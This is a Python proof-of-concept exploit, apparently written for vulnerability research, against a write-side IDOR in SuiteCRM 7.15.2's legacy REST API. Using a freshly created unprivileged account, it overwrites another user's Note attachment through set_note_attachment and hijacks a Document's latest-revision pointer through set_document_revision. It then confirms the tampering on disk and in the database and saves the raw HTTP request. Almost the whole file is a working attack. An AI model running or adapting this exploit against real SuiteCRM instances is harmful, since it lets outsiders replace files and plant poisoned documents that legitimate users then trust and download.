#!/usr/bin/env python3
"""
VULN-079 -- Legacy `set_note_attachment`/`set_document_revision`: overwrite any Note
            attachment / add a revision to any Document by id (write-side IDOR).

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/core/SugarWebServiceImpl.php:772 (set_note_attachment -> NoteSoap::
             newSaveFile) / :849 (set_document_revision -> DocumentSoap::saveFile). Both
             gates are session-only (empty/caller-chosen module) -- NEITHER loads the
             target Note/Document and calls checkACLAccess() before writing.

Plan
----
PART A -- set_note_attachment overwrites ANY Note's attachment, zero ACL, zero setup:
  1. Admin creates a Note and attaches an original file (the "victim" content).
  2. A completely fresh, unprivileged low-priv user -- no Role, no special setup at all --
     calls set_note_attachment with that SAME note id and attacker-controlled bytes,
     omitting related_module_id/name entirely (so the caller-chosen 'read' check never
     even engages -- pure session-only gate).
  3. Verify on the app container's disk (independent of the API's own response) that the
     Note's attachment file now contains the attacker's bytes, not the original.

PART B -- set_document_revision plants a new "latest revision" on ANY Document:
  1. Admin creates a Document with an initial revision (the "victim" content) --
     DocumentSoap::saveFile() sets $document->document_revision_id to that revision,
     i.e. it becomes what every legitimate viewer downloads by default.
  2. The SAME unprivileged low-priv user calls set_document_revision with that Document's
     id and attacker-controlled bytes.
  3. DocumentSoap::saveFile() ALSO does `$focus->document_revision_id = $revision->id;
     $focus->save();` -- so the attacker's revision becomes the new latest-revision pointer
     on a Document the attacker does not own. Verified via the `documents` DB row and an
     independent disk read of the new revision's bytes.
"""
import base64
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, create_user, rest_login, rest_call)
from _c1_common import db_rows, app_exec

VULN_ID = "VULN-079"
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN_ID, "set_note_attachment / set_document_revision write-side IDOR")

    log("SETUP", "admin web + legacy REST session; a completely ordinary low-priv user (no ACL setup at all)")
    admin_s = admin_session()
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)
    low = create_user(admin_s, rand("Pw") + "!2026x")
    low_sid = rest_login(low["user_name"], low["password"])
    log("OK", f"low-priv user {low['user_name']} id={low['id']} -- zero special Role/ACL configured")

    # =====================================================================================
    # PART A -- set_note_attachment overwrite
    # =====================================================================================
    log("STEP", "PART A: admin creates a Note with an original attachment")
    resN = rest_call("set_entry", [admin_sid, "Notes", [{"name": "name", "value": f"Stage10 VULN-079 Note {rand('n')}"}]])
    note_id = resN.get("id")
    original_bytes = f"ORIGINAL-OWNER-CONTENT-{rand('orig')}\n".encode()
    resNA = rest_call("set_note_attachment", [admin_sid, {
        "id": note_id, "filename": "original.txt", "file": base64.b64encode(original_bytes).decode(),
    }])
    log("INFO", f"admin set_note_attachment -> {resNA}")
    disk_before = app_exec(f"base64 -w0 /var/www/html/upload/{note_id}").strip()
    disk_before_bytes = base64.b64decode(disk_before) if disk_before else b""
    log("INFO", f"Note {note_id} on-disk content BEFORE attack: {disk_before_bytes!r}")
    if disk_before_bytes != original_bytes:
        verdict(VULN_ID, "FAILED", f"precondition failed: Note attachment not seeded correctly ({disk_before_bytes!r})")
        sys.exit(1)

    attacker_bytes = f"ATTACKER-OVERWRITE-{rand('atk')}\n".encode()
    log("STEP", f"low-priv (no related_module_id/name -> pure session-only gate) overwrites Note {note_id}")
    payloadA = {"id": note_id, "filename": "pwned.txt", "file": base64.b64encode(attacker_bytes).decode()}
    resAttack = rest_call("set_note_attachment", [low_sid, payloadA])
    log("INFO", f"low-priv set_note_attachment -> {resAttack}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(
            "POST /service/v4_1/rest.php HTTP/1.1\n"
            f"Host: {BASE_URL.split('//', 1)[1]}\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            f'method=set_note_attachment&input_type=JSON&response_type=JSON&rest_data='
            f'["{low_sid}",{json.dumps(payloadA)}]\n'
        )
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(json.dumps(resAttack, indent=2))
    with open(os.path.join(HERE, "evidence", "partA_set_note_attachment_response.json"), "w") as f:
        json.dump(resAttack, f, indent=2)

    disk_after = app_exec(f"base64 -w0 /var/www/html/upload/{note_id}").strip()
    disk_after_bytes = base64.b64decode(disk_after) if disk_after else b""
    log("INFO", f"Note {note_id} on-disk content AFTER attack: {disk_after_bytes!r}")
    with open(os.path.join(HERE, "evidence", "partA_note_file_after.bin"), "wb") as f:
        f.write(disk_after_bytes)

    part_a_ok = disk_after_bytes == attacker_bytes and disk_after_bytes != original_bytes
    log("PROOF", f"Note attachment overwritten by an unrelated, unprivileged user = {part_a_ok} "
                 f"(before={original_bytes!r}, after={disk_after_bytes!r})")

    # =====================================================================================
    # PART B -- set_document_revision plants a new latest-revision pointer
    # =====================================================================================
    log("STEP", "PART B: admin creates a Document with an original revision")
    resD = rest_call("set_entry", [admin_sid, "Documents", [
        {"name": "document_name", "value": f"Stage10 VULN-079 Doc {rand('d')}"},
        {"name": "doc_type", "value": "Sugar"}, {"name": "active_date", "value": "01/01/2026"},
    ]])
    doc_id = resD.get("id")
    original_doc_bytes = f"ORIGINAL-DOCUMENT-CONTENT-{rand('origd')}\n".encode()
    resDR = rest_call("set_document_revision", [admin_sid, {
        "id": doc_id, "revision": "1", "filename": "original.txt",
        "file": base64.b64encode(original_doc_bytes).decode(),
    }])
    original_revision_id = resDR.get("id")
    log("OK", f"Document id={doc_id}, original revision id={original_revision_id}")

    doc_rows_before = db_rows(f"SELECT document_revision_id FROM documents WHERE id='{doc_id}';")
    log("INFO", f"documents.document_revision_id BEFORE attack: {doc_rows_before}")

    attacker_doc_bytes = f"ATTACKER-PLANTED-REVISION-{rand('atkd')}\n".encode()
    log("STEP", f"low-priv (session-only gate, empty module) adds a new revision to Document {doc_id}")
    payloadB = {"id": doc_id, "revision": "2", "filename": "malicious.txt",
                "file": base64.b64encode(attacker_doc_bytes).decode()}
    resAttackD = rest_call("set_document_revision", [low_sid, payloadB])
    new_revision_id = resAttackD.get("id")
    log("INFO", f"low-priv set_document_revision -> {resAttackD}")
    with open(os.path.join(HERE, "evidence", "partB_set_document_revision_response.json"), "w") as f:
        json.dump(resAttackD, f, indent=2)

    doc_rows_after = db_rows(f"SELECT document_revision_id FROM documents WHERE id='{doc_id}';")
    log("INFO", f"documents.document_revision_id AFTER attack: {doc_rows_after}")

    latest_revision_hijacked = (bool(doc_rows_after) and new_revision_id
                                 and doc_rows_after[0]["document_revision_id"] == new_revision_id
                                 and doc_rows_after[0]["document_revision_id"] != original_revision_id)

    disk_new_rev = app_exec(f"base64 -w0 /var/www/html/upload/{new_revision_id}").strip() if new_revision_id else ""
    disk_new_rev_bytes = base64.b64decode(disk_new_rev) if disk_new_rev else b""
    with open(os.path.join(HERE, "evidence", "partB_new_revision_file.bin"), "wb") as f:
        f.write(disk_new_rev_bytes)
    bytes_match = disk_new_rev_bytes == attacker_doc_bytes

    log("PROOF", f"Document's latest-revision pointer hijacked by an unrelated, unprivileged user = "
                 f"{latest_revision_hijacked} (now points to {new_revision_id}, was {original_revision_id}); "
                 f"planted bytes on disk match attacker payload = {bytes_match}")

    part_b_ok = latest_revision_hijacked and bytes_match

    ok = part_a_ok and part_b_ok
    if not ok:
        reasons = []
        if not part_a_ok:
            reasons.append("Part A: Note attachment was not overwritten with attacker bytes")
        if not part_b_ok:
            reasons.append(f"Part B: latest-revision hijack incomplete (pointer={latest_revision_hijacked}, bytes={bytes_match})")
        verdict(VULN_ID, "FAILED", "; ".join(reasons))
        sys.exit(1)

    log("OK", "Confirmed: a completely unprivileged, unrelated user overwrote another user's Note "
              "attachment AND hijacked a Document's latest-revision pointer to attacker-controlled "
              "content, with no ACL check on the target record in either path.")
    verdict(VULN_ID, "CONFIRMED",
            f"Part A: Note {note_id} attachment overwritten ({original_bytes[:20]!r} -> {disk_after_bytes[:20]!r}); "
            f"Part B: Document {doc_id} latest-revision pointer hijacked to attacker revision {new_revision_id} "
            f"({original_doc_bytes[:20]!r} -> {disk_new_rev_bytes[:20]!r})")
    sys.exit(0)


if __name__ == "__main__":
    main()
